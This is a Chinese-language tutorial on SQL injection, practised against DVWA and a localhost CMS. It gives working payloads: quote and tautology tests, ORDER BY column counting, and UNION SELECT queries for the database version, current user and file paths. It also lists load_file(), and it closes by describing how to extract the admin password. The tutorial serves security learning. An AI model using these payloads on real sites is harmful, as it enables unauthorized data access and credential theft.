@@ -1,0 +1,91 @@
+一、SQL注入技术
+sql注入，顾名思义，就是通过sql语句去web后端的数据库打交道，凡是存在数据库的web，基本都可能存在类似的网站，在OWASP的top10里也是首屈一指的，sql注入最终的目的就是通过从url或者其他的一些地方传入一些参数，从而构建数据库查询语句，去后台查一些表项，在实际中一般用这个技术去查询管理员账户。。。举一个例子吧，在例子中使用使用Damn Vulnerable Web App这个测试平台吧，这个平台我觉得如果是用来研究这些技术的原理的话，还算方便。
+二、测试步骤
+1）.打开dvwa：
+
+2）点开左边的sql injection 
+    在页面上点击提交按钮，在提交到服务器的http请求包里，会带有下列字段：GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit ，抓取字段的方法是使用burpsuit，使用方法不多说了。提交到后台请求如下：
+
+    
+
+131031 4:05:48 587 Connect dvwa@localhost on 
+587 Init DB	dvwa
+587 Query	SELECT first_name, last_name FROM users WHERE user_id = '1'
+
+   通过后台的查询语句可以看出，在url提交的id的值，传入到了后台构造的查询语句。所有的注入，都是根据后台的这个查询语句来进行构造的。例如，在前面的页面传入1=1
+
+后台的查询语句为：
+
+131031 4:11:19 588 Connect dvwa@localhost on 
+588 Init DB	dvwa
+588 Query	SELECT first_name, last_name FROM users WHERE user_id = '1=1'
+
+   下面在前面提交 1'='1,后台构造的语句为：
+
+131031 4:13:29 589 Connect dvwa@localhost on 
+589 Init DB	dvwa
+589 Query	SELECT first_name, last_name FROM users WHERE user_id = '1'='1'
+
+   后台的语句其实就是构造后的成果了，所有的sql注入最终基本都是为了形成类似的语句，只是可能最后构造的查询语句的表现形式不一样，可能会通过各种编码来的形式来展现。
+
+ 
+
+    下面就通过在前面提交些特殊字符，来查出后台尽量多的数据：
+
+    1、在页面提交   1'or 1=1 order by 1 -- 查看结果
+
+    2、在页面提交  1'or 1=1 order by 2 --  查看结果
+
+    3、在页面提交   1'or 1=1 order by 3 -- 查看结果
+
+    判断是否有sql注入漏洞的方式并不是只有这三种，只要是为真条件就可以，比如 1‘ or 1>0 这类的也可以
+
+    在一般注入过程中，会使用这种办法去判断当前的表有几列，前两个的输出结果会比较正常，最后的显示会报错，说明当前的表有2列。有了这个数据，就可以通过union关键字去抓其他的东西，例如：
+
+     查看当前数据库版本：在页面提交  1' union select 1,version() --  可以查看到版本的一些信息
+
+     查看当前会话：1' union select 1,current_user()  --   等等，用这种方式去查看其他的一些信息
+
+     其他查什么用户名啊，等等吧，都是这种方式。
+
+    基本sql注入的大前提就是sql注入查询语句，在存在sql注入的情况下，你可以直接在输入框、网址栏等地方直接输入一定的查询语句，可以随心所欲的查训信息。     
+
+
+3）.判断是否有漏洞
+在url后面添加' ,查看报错信息，例：http://localhost/cms/show.php?id=36'，此时会报错，报错类型为：  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1，从报错信息来看，我们构造的id=36'已经被传到了mysql后台，即后台没有过滤特殊字符，这种类型基本可以判断为一个注入点，下面现在url后面添加真条件，如： http://localhost/cms/show.php?id=36 and 1=1 -- 。  此时发现返回的页面正常，将1=1换成1=2后，返回的页面跟1=1的页面不一样，此时可断定为注入漏洞
+
+
+
+4）.判断数据库版本等信息，如：用户、版本等，在此步之前，需要判断当前表的列数，后面要用到union语句将其他的信息连接在当前表项后，如，在url后面添加order by 17后出现的报错信息为：
+
+            http://localhost/cms/show.php?id=36 order by 17
+  Unknown column '17' in 'order clause'，报错信息说明列数没有17列，那么将17改为15呢？结果发现页面正常出现了，那么将17改为16呢：结果还是报错，这个时候就说明当前表为15列，即存储id=36的这个文章的表的列数为15接下来要做的就是查询一些信息，首先输入http://localhost/cms/show.php?id=-36 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --  ，输入id=-36是为了将后面的信息显现出来，否则只显示id36的，后面的查询结果都会被覆盖，输入上面的信息之后，通过上面的信息可以看出，第3列和第11列显示在了比较显眼的地方，那么就把3和11换成我们想知道的消息即可，如将3换成version()，将11换成current_user()，或者user()查看下结果:
+
+
+
+
+
+通过这就可以看到一些信息，那么现在查看一些有用的信息，常见的有:(收集信息很重要，对后面的操作有很大的影响，每个版本的数据库注入语句都不一样)
+
+               a:system_user() 系统用户名
+               b:user()        用户名
+               c:current_user()  当前用户名
+               d:session_user()连接数据库的用户名
+               e:database()    数据库名
+               f:version()     MYSQL数据库版本
+               g:load_file()   MYSQL读取本地文件的函数
+               h:@@datadir     读取数据库路径
+               i:@@basedir    MYSQL 安装路径
+               j:@@version_compile_os   操作系统
+
+               将3和11分别换成上面的信息，得到的结果如下：
+
+               system_user(),user(),current_user(),session_user():root@localhost     database():cms  version():5.6.12-log                   @@basedir:c:/wamp/bin/mysql/mysql5.6.12     @@datadir:c:\wamp\bin\mysql\mysql5.6.12\data\ 
+  
+5）.查询管理员表，获得管理员登录密码                                                        
+
+
+   截图里的url输入的是判断username是不是为空，即判断是不是存在username字段，如果存在文章正常显示，如果把username改为name，显示不正常，以此来判断是否存在字段。  判断用户名：
+
+上述语句可以判断是否存在用户名，再判断是否存在password字段，再查看密码：
+这样最后就能知道密码了。
